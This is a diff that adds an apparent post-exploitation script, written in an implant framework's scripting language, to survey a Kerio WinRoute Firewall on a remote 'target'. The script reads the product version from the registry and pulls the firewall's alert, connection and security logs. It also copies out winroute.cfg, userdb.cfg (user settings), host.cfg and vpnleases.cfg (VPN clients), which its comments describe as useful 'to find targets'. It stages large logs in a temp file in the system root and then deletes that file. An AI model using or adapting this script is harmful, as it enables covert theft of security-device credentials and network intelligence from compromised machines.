@@ -1,0 +1,196 @@
+#########################################################################################
+# Check Kerio settings and pull configurations
+# Written 3/12/10
+#########################################################################################
+
+@include "PSPHelpers.epm";
+@include "PerlFunctions.epm";
+metaData @metaData;
+init(@metaData);
+
+# Change this to get more logs....
+int $maxLogSize = 100000;
+
+echo "Starting Kerio configuration check....";
+string $temp;
+@record on;
+@echo off;
+
+ifnot (reg_query("software\\kerio\\WinRoute", "Version", $temp)) {
+	ifnot (reg_query("software\\microsoft\\windows\\currentversion\\uninstall\\{ABF9F762-FF6B-4260-A0FF-579B80260404}", "DisplayVersion", $temp)) {
+		echo "Can't get version!  Check it manually and get guidance.";
+		@metaData.$version = "unknown";
+		return false;
+	}
+	echo "Version = $temp";
+	@metaData.$version = $temp;
+	@metaData.$product = "WinRoute Firewall";
+} else {
+	echo "Version = $temp";
+	@metaData.$version = $temp;
+	@metaData.$product = "WinRoute Firewall";
+}
+
+@metadata.$vendor = "Kerio";
+if(writeMetaData(@metaData)) {
+	echo "Wrote meta data to disk";
+} else {
+	echo "ERROR: Could not write meta data to disk.";
+}
+
+
+string $systemRoot;
+`lpgetenv -option SYSTEMROOT`;
+$systemRoot = GetCmdData("value");
+
+#########################################################################################
+# Go get the logs
+#########################################################################################
+`remotelocaltime`;
+string $rd; 
+string $rt;
+$rd = GetCmdData("remoteDate");
+$rt = GetCmdData("remoteTime");
+echo "";
+echo "The current target time for reference is $rd $rt";
+
+echo "Checking for recent logs.\n";
+echo "Security logs == start and stop of PSP";
+echo "Alert logs == Alerts sent to console";
+echo "Warning logs == Warnings sent to console";
+echo "Connection logs == Shows connection attempts (if configured)\n";
+
+bool $isDir;
+int $size;
+string $name;
+string $path;
+`dir "C:\\program files\\kerio\\winroute firewall\\logs\\*"`;
+$isDir = GetCmdData("isdir");
+$size = GetCmdData("size");
+$name = GetCmdData("name");
+$path = GetCmdData("path");
+
+int $i = 0;
+string $file;
+foreach $file ($name) {
+	ifnot($isDir[$i]) {
+		# this is a file
+		string $parts;
+		$parts = split(".", $file);
+		# this next part effectively gets rid of .idx files which are currently in use. (you still have to copyget the logs).
+		if (sizeof($parts) == 2) {
+			if ($parts[0] == "alert" || $parts[0] == "connection" || $parts[0] == "warning" || $parts[0] == "security") {
+				getLog("C:\\program files\\kerio\\winroute firewall\\logs", $file, $systemRoot, $maxLogSize);
+			}
+		}
+	}
+	$i++;
+}
+
+
+#########################################################################################
+# Get the configs
+#########################################################################################
+string $kpath = "C:\\program files\\kerio\\winroute firewall";
+echo "\n\nPulling PSP configs...\n";
+`dir "$kpath\\winroute.cfg"`;
+$size = GetCmdData("size");
+echo "Winroute.cfg (main configuration file) is $size bytes.";
+if (prompt"Do you want to get the file?") {
+	`get "$kpath\\winroute.cfg"`;
+}
+
+echo "\n\nWe can pull other configs, but these are usually of more interest to find targets, get stats about targets, etc.";
+if (prompt "Do you want to pull additional configuration information for possible analysis?") {
+	echo "Getting userdb.cfg (contains firewall user settings)";
+	`get "$kpath\\userdb.cfg"`;
+	echo "Getting host.cfg (contains information about remote hosts)";
+	`get "$kpath\\host.cfg"`;
+	echo "Getting logs.cfg (contains information about log locations and rotations)";
+	`get "$kpath\\logs.cfg"`;
+	echo "Getting vpnleases.cfg (contains information about VPN clients)";
+	`get "$kpath\\vpnleases.cfg"`;
+	`dir "$kpath\\stats.cfg"`;
+	$size = GetCmdData("size");
+	if ($size > $maxLogSize) {
+		echo "stats.log file is $size bytes.";
+	       	if (prompt "Do you want to get it?") {
+			`get "$kpath\\stats.cfg"`;
+		}
+	} else {
+		echo "Getting stats.cfg (contains MRTG like configuration)";
+		`get "$kpath\\stats.cfg"`;
+	}
+}
+@echo on;
+@record off;
+
+###################################################
+# Offer to get the logs (needs copyget style)
+# Since logs can be huge, only get the first X bytes
+###################################################
+sub getLog(IN string $path, IN string $file, IN string $systemRoot, IN int $maxSize) {
+	if (`getfileattribs -file "$path\\$file"`) {
+		string $modDate;
+		string $modTime;
+		int $size;
+		$modDate = GetCmdData("ModifiedDate");
+		$modTime = GetCmdData("ModifiedTime");
+		$size = GetCmdData("size");
+		echo "\n\n$modDate  $modTime   $size   $file";
+		if ($size == 0) {
+			echo "File is empty, skipping...";
+		}
+		else if ($size < $maxSize) {
+			if (prompt "Do you want to copyget the file?") {
+				`copyget "$path\\$file"`;
+			}
+		} else {
+			if (prompt "Do you want to get the last $maxSize bytes of the file?") {
+				`copy "$path\\$file" "$systemRoot\\at3.tmp"`;
+				`get "$systemRoot\\at3.tmp" -tail $maxSize -foreground -name $file`;
+				`del at3.tmp -path "$systemRoot"`;
+			}
+		}
+	} else {
+		return false;	
+	}
+}
+
+sub reg_query(IN string $subkey, IN string $search_values, OUT string $ret)
+{
+	string $values;
+	string $value;
+	string $value_data;
+	int $i=0;
+	int $j=0;
+
+	@record on;
+	if(`regquery -hive L -subkey "$subkey"`)
+	{
+		$values = GetCmdData("value");
+		$value_data = GetCmdData("value_data");
+		
+		string $search_value;		
+		foreach $search_value ($search_values)	
+		{
+			$j = 0;
+			foreach $value ($values)
+			{
+				if($value == $search_value)
+				{
+					$ret[$i] = $value_data[$j];
+				}
+				$j++;
+			}
+			$i++;
+		}
+		ifnot(defined($ret)) {
+			$ret = "NTR";
+		}
+		return true;
+	} else {
+		return false;
+	}
+
+}
